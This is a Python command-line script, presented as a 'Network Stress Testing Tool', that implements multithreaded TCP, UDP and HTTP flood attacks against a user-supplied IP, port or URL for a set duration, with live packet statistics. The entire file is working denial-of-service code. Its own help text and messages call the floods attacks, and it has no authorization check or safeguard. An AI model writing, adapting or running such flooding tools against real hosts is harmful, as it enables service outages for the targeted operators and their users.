#!/usr/bin/env python3
import argparse
import socket
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

class NetworkStressTester:
    def __init__(self):
        self.running = False
        self.lock = threading.Lock()
        self.sent_packets = 0
        self.start_time = 0

    def _update_stats(self):
        """Worker thread to display real-time attack statistics."""
        while self.running:
            elapsed_time = time.time() - self.start_time
            if elapsed_time > 0:
                pps = self.sent_packets / elapsed_time
                with self.lock:
                    print(f"\rElapsed: {elapsed_time:.1f}s | Packets Sent: {self.sent_packets} | PPS: {pps:.1f}", end="")
            time.sleep(0.5)

    def _attack_worker(self, attack_func, end_time):
        """Generic worker to run the attack function and count packets."""
        while self.running and time.time() < end_time:
            try:
                attack_func()
                with self.lock:
                    self.sent_packets += 1
            except Exception:
                pass # Suppress socket errors during flood

    def start_flood(self, flood_type, target, port, duration, num_threads, **kwargs):
        """Main controller for starting and managing a flood attack."""
        self.running = True
        self.sent_packets = 0
        self.start_time = time.time()
        end_time = self.start_time + duration

        attack_func = None
        if flood_type == 'tcp':
            attack_func = self._create_tcp_socket_attack(target, port)
        elif flood_type == 'udp':
            packet_size = kwargs.get('size', 1024)
            attack_func = self._create_udp_socket_attack(target, port, packet_size)
        elif flood_type == 'http':
            attack_func = self._create_http_request_attack(target)
        else:
            print("Invalid flood type.")
            return

        print(f"\nStarting {flood_type.upper()} flood on {target}:{port} for {duration} seconds using {num_threads} threads.")
        print("Press Ctrl+C to stop.")

        # Start the statistics thread
        stats_thread = threading.Thread(target=self._update_stats)
        stats_thread.daemon = True
        stats_thread.start()

        # Start worker threads
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(self._attack_worker, attack_func, end_time) for _ in range(num_threads)]
            try:
                # This keeps the main thread alive, waiting for the duration or a Ctrl+C
                time.sleep(duration)
            except KeyboardInterrupt:
                print("\nStopping attack...")
            finally:
                self.stop_attacks()
                # Wait for the stats thread to finish its last print
                stats_thread.join(timeout=1)

        print(f"\n\nAttack finished. Total packets sent: {self.sent_packets}")

    def _create_tcp_socket_attack(self, target_ip, target_port):
        def attack():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
        return attack

    def _create_udp_socket_attack(self, target_ip, target_port, size):
        data = random._urandom(size)
        def attack():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (target_ip, target_port))
            s.close()
        return attack

    def _create_http_request_attack(self, target_url):
        # Lazy import to avoid dependency if not used
        import requests
        def attack():
            requests.get(target_url, timeout=5)
        return attack

    def stop_attacks(self):
        """Stops all running attack threads."""
        self.running = False
        print("\rStopping all threads... Please wait.", end="")


def main():
    parser = argparse.ArgumentParser(description="Network Stress Testing Tool")
    subparsers = parser.add_subparsers(dest='command', required=True)

    # TCP Flood
    tcp_parser = subparsers.add_parser('tcp', help='TCP flood attack')
    tcp_parser.add_argument('target_ip', help='Target IP address')
    tcp_parser.add_argument('port', type=int, help='Target port')
    tcp_parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    tcp_parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads')

    # UDP Flood
    udp_parser = subparsers.add_parser('udp', help='UDP flood attack')
    udp_parser.add_argument('target_ip', help='Target IP address')
    udp_parser.add_argument('port', type=int, help='Target port')
    udp_parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    udp_parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads')
    udp_parser.add_argument('-s', '--size', type=int, default=1024, help='Packet size in bytes')

    # HTTP Flood
    http_parser = subparsers.add_parser('http', help='HTTP flood attack')
    http_parser.add_argument('target_url', help='Target URL (e.g., http://example.com)')
    http_parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    http_parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads')

    args = parser.parse_args()
    tester = NetworkStressTester()

    if args.command in ['tcp', 'udp']:
        tester.start_flood(args.command, args.target_ip, args.port, args.duration, args.threads, size=getattr(args, 'size', None))
    elif args.command == 'http':
        # For HTTP, the port is part of the URL
        tester.start_flood(args.command, args.target_url, 80, args.duration, args.threads)

if __name__ == "__main__":
    main()
